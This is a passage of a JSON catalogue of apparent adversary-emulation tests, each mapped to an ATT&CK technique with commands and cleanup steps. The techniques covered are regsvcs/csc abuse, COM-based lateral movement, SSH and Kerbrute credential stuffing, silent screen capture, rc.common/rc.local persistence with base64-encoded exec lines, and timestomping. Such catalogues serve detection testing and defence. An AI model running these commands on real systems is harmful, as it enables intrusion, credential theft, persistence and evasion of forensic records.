			"command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n",
			"cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore | Out-Null\n$parentpath = Split-Path -Path \"#{output_file}\"\nRemove-Item $parentpath\\key.snk -ErrorAction Ignore | Out-Null\nRemove-Item $parentpath\\T1218.009.tlb -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1218.009",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Compile After Delivery using csc.exe",
		"auto_generated_guid": "ffcdbd6a-b0e8-487d-927a-09127fe9a206",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Output compiled binary",
				"type": "path",
				"default": "C:\\Windows\\Temp\\T1027.004.exe"
			},
			"input_file": {
				"description": "C# code that launches calc.exe from a hidden cmd.exe Window",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1027.004\\src\\calc.cs"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "C# file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/calc.cs\" -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \"#{input_file}\"\n",
			"cleanup_command": "del #{output_file} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1027.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Dynamic C# Compile",
		"auto_generated_guid": "453614d8-3ba6-4147-acc0-7ec4b3e1faef",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "exe program containing dynamically compiled C# code",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1027.004\\bin\\T1027.004_DynamicCompile.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "exe file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/bin/T1027.004_DynamicCompile.exe -OutFile \"#{input_file}\"\n"
			}
		],
		"executor": {
			"command": "Invoke-Expression \"#{input_file}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1027.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "C compile",
		"auto_generated_guid": "d0377aa6-850a-42b2-95f0-de558d80be57",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_file": {
				"description": "source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.c"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "the source file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O \"#{input_file}\"\n"
			}
		],
		"executor": {
			"command": "gcc #{input_file} && ./a.out\nclang #{input_file} && ./a.out\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "CC compile",
		"auto_generated_guid": "da97bb11-d6d0-4fc1-b445-e443d1346efe",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_file": {
				"description": "source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "the source file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O #{input_file}\n"
			}
		],
		"executor": {
			"command": "g++ #{input_file} && ./a.out\nclang++ #{input_file} && ./a.out\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Go compile",
		"auto_generated_guid": "78bd3fa7-773c-449e-a978-dc1f1500bc52",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"input_file": {
				"description": "source file",
				"type": "path",
				"default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.go"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "the source file must exist on disk at specified location (#{input_file})\n",
				"prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O #{input_file}\n"
			}
		],
		"executor": {
			"command": "go run #{input_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1027.004",
		"phases": ["defense-evasion"]
	},
	{
		"name": "PowerShell Lateral Movement using MMC20",
		"auto_generated_guid": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"computer_name": {
				"description": "Name of Computer",
				"type": "string",
				"default": "localhost"
			}
		},
		"executor": {
			"command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"#{computer_name}\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1021.003",
		"phases": ["lateral-movement"]
	},
	{
		"name": "PowerShell Lateral Movement Using Excel Application Object",
		"auto_generated_guid": "505f24be-1c11-4694-b614-e01ae1cd2570",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
			}
		],
		"input_arguments": {
			"computer_name": {
				"description": "Hostname or IP",
				"type": "string",
				"default": "localhost"
			},
			"user": {
				"description": "Name of user",
				"type": "string",
				"default": "admin"
			}
		},
		"executor": {
			"command": "copy c:\\windows\\system32\\calc.exe 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"#{computer_name}\"))\n$com.ActivateMicrosoftApp(\"5\")\n",
			"name": "powershell",
			"cleanup_command": "Remove-Item 'C:\\users\\#{user}\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n",
			"elevation_required": false
		},
		"attack_technique": "T1021.003",
		"phases": ["lateral-movement"]
	},
	{
		"name": "Running Chrome VPN Extensions via the Registry 2 vpn extension",
		"auto_generated_guid": "4c8db261-a58b-42a6-a866-0a294deedde4",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"chrome_url": {
				"description": "chrome installer download URL",
				"type": "url",
				"default": "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe"
			},
			"extension_id": {
				"description": "chrome extension id",
				"type": "string",
				"default": "\"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Chrome must be installed\n",
				"prereq_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" #{chrome_url}\nStart-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" /S\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n",
			"cleanup_command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\nRemove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}\n"
		},
		"attack_technique": "T1133",
		"phases": ["initial-access", "persistence"]
	},
	{
		"name": "SSH Credential Stuffing From Linux",
		"auto_generated_guid": "4f08197a-2a8a-472d-9589-cd2895ef22ad",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"target_host": {
				"description": "IP Address / Hostname you want to target.",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Requires SSHPASS\n",
				"prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"
		},
		"attack_technique": "T1110.004",
		"phases": ["credential-access"]
	},
	{
		"name": "SSH Credential Stuffing From MacOS",
		"auto_generated_guid": "d546a3d9-0be5-40c7-ad82-5a7d79e1b66b",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"target_host": {
				"description": "IP Address / Hostname you want to target.",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Requires SSHPASS\n",
				"prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": false,
			"command": "cp \"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"
		},
		"attack_technique": "T1110.004",
		"phases": ["credential-access"]
	},
	{
		"name": "SSH Credential Stuffing From FreeBSD",
		"auto_generated_guid": "a790d50e-7ebf-48de-8daa-d9367e0911d4",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"target_host": {
				"description": "IP Address / Hostname you want to target.",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires SSHPASS\n",
				"prereq_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "pkg install -y sshpass\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n"
		},
		"attack_technique": "T1110.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Brute Force:Credential Stuffing using Kerbrute Tool",
		"auto_generated_guid": "4852c630-87a9-409b-bb5e-5dc12c9ebcde",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domaincontroller": {
				"description": "Domain controller where test will be run",
				"type": "string",
				"default": "$ENV:userdnsdomain"
			},
			"domain": {
				"description": "Domain where you will be testing",
				"type": "string",
				"default": "$ENV:userdomain"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
			},
			{
				"description": "bruteforce.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
				"prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n"
		},
		"attack_technique": "T1110.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Screencapture",
		"auto_generated_guid": "0f47ceb1-720f-4275-96b8-21f0562217ac",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.png"
			}
		},
		"executor": {
			"command": "screencapture #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Screencapture (silent)",
		"auto_generated_guid": "deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.png"
			}
		},
		"executor": {
			"command": "screencapture -x #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "X Windows Capture",
		"auto_generated_guid": "8206dd0c-faf6-4d74-ba13-7fbe13dce6ac",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.xwd"
			},
			"package_checker": {
				"description": "Package checking command for linux. Debian system command- dpkg -s x11-apps",
				"type": "string",
				"default": "rpm -q xorg-x11-apps"
			},
			"package_installer": {
				"description": "Package installer command for linux. Debian system command- apt-get install x11-apps",
				"type": "string",
				"default": "yum install -y xorg-x11-apps"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "Package with XWD and XWUD must exist on device\n",
				"prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "sudo #{package_installer} \n"
			}
		],
		"executor": {
			"command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "X Windows Capture (freebsd)",
		"auto_generated_guid": "562f3bc2-74e8-46c5-95c7-0e01f9ccc65c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.xwd"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Package with XWD and XWUD must exist on device\n",
				"prereq_command": "if [ -x \"$(command -v xwd)\" ]; then exit 0; else exit 1; fi\nif [ -x \"$(command -v xwud)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "pkg install -y xwd xwud \n"
			}
		],
		"executor": {
			"command": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Capture Linux Desktop using Import Tool",
		"auto_generated_guid": "9cd1cccb-91e4-4550-9139-e20a586fcea1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.png"
			}
		},
		"dependencies": [
			{
				"description": "ImageMagick must be installed\n",
				"prereq_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "sudo apt install graphicsmagick-imagemagick-compat\n"
			}
		],
		"executor": {
			"command": "import -window root #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Capture Linux Desktop using Import Tool (freebsd)",
		"auto_generated_guid": "18397d87-38aa-4443-a098-8a48a8ca5d8d",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "/tmp/T1113_desktop.png"
			}
		},
		"dependencies": [
			{
				"description": "ImageMagick must be installed\n",
				"prereq_command": "if import -help > /dev/null 2>&1; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "pkg install -y ImageMagick7\n"
			}
		],
		"executor": {
			"command": "import -window root #{output_file}\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Windows Screencapture",
		"auto_generated_guid": "3c898f62-626c-47d5-aad2-6de873d69153",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Output file path",
				"type": "path",
				"default": "c:\\temp\\T1113_desktop.zip"
			},
			"recording_time": {
				"description": "Time to take screenshots",
				"type": "integer",
				"default": 5
			}
		},
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout #{recording_time} > NULL && psr.exe /stop\"\n",
			"cleanup_command": "rm #{output_file} -ErrorAction Ignore\n"
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Windows Screen Capture (CopyFromScreen)",
		"auto_generated_guid": "e9313014-985a-48ef-80d9-cde604ffc187",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "$env:TEMP\\T1113.png"
			}
		},
		"executor": {
			"command": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n",
			"cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted",
		"auto_generated_guid": "5a496325-0115-4274-8eb9-755b649ad0fb",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n",
			"cleanup_command": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 1 /f\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1113",
		"phases": ["collection"]
	},
	{
		"name": "rc.common",
		"auto_generated_guid": "97a48daa-8bca-4bc0-b1a9-c1d163e762de",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n",
			"elevation_required": true,
			"name": "bash"
		},
		"attack_technique": "T1037.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "rc.common",
		"auto_generated_guid": "c33f3d80-5f04-419b-a13a-854d1cbdbf3a",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n",
			"cleanup_command": "origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi\n"
		},
		"attack_technique": "T1037.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "rc.local",
		"auto_generated_guid": "126f71af-e1c9-405c-94ef-26a47b16c102",
		"supported_platforms": ["linux"],
		"executor": {
			"name": "sh",
			"elevation_required": true,
			"command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\n[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\necho \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n",
			"cleanup_command": "origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi\n"
		},
		"attack_technique": "T1037.004",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Set a file's access timestamp",
		"auto_generated_guid": "5f9113d5-ed75-47ed-ba23-ea3573d05810",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"target_filename": {
				"description": "Path of file that we are going to stomp on last access time",
				"type": "path",
				"default": "/tmp/T1070.006-access.txt"
			}
		},
		"dependencies": [
			{
				"description": "The file must exist in order to be timestomped\n",
				"prereq_command": "test -e #{target_filename} && exit 0 || exit 1\n",
				"get_prereq_command": "echo 'T1070.006 file access timestomp test' > #{target_filename}\n"
			}
		],
		"executor": {
			"command": "touch -a -t 197001010000.00 #{target_filename}\n",
			"cleanup_command": "rm -f #{target_filename}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Set a file's modification timestamp",
		"auto_generated_guid": "20ef1523-8758-4898-b5a2-d026cc3d2c52",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"target_filename": {
				"description": "Path of file that we are going to stomp on last access time",
				"type": "path",
				"default": "/tmp/T1070.006-modification.txt"
			}
		},
		"dependencies": [
			{
				"description": "The file must exist in order to be timestomped\n",
				"prereq_command": "test -e #{target_filename} && exit 0 || exit 1\n",
				"get_prereq_command": "echo 'T1070.006 file modification timestomp test' > #{target_filename}\n"
			}
		],
		"executor": {
			"command": "touch -m -t 197001010000.00 #{target_filename}\n",
			"cleanup_command": "rm -f #{target_filename}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Set a file's creation timestamp",
		"auto_generated_guid": "8164a4a6-f99c-4661-ac4f-80f5e4e78d2b",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"target_filename": {
				"description": "Path of file that we are going to stomp on last access time",
				"type": "path",
				"default": "/tmp/T1070.006-creation.txt"
			}
		},
		"executor": {
			"elevation_required": true,
			"command": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch #{target_filename}\ndate \"$NOW\"\nstat #{target_filename}\n",
			"cleanup_command": "rm -f #{target_filename}\n",
			"name": "sh"
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Modify file timestamps using reference file",
		"auto_generated_guid": "631ea661-d661-44b0-abdb-7a7f3fc08e50",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"target_file_path": {
				"description": "Path of file to modify timestamps of",
				"type": "path",
				"default": "/tmp/T1070.006-reference.txt"
			},
			"reference_file_path": {
				"description": "Path of reference file to read timestamps from",
				"type": "path",
				"default": "/bin/sh"
			}
		},
		"executor": {
			"command": "touch #{target_file_path}\ntouch -acmr #{reference_file_path} #{target_file_path}\n",
			"cleanup_command": "rm -f #{target_file_path}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1070.006",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Windows - Modify file creation timestamp with PowerShell",
		"auto_generated_guid": "b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"target_date_time": {
				"description": "Date/time to replace original timestamps with",
				"type": "string",
				"default": "01/01/1970 00:00:00"
			},
			"file_path": {
				"description": "Path of file to change creation timestamp",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
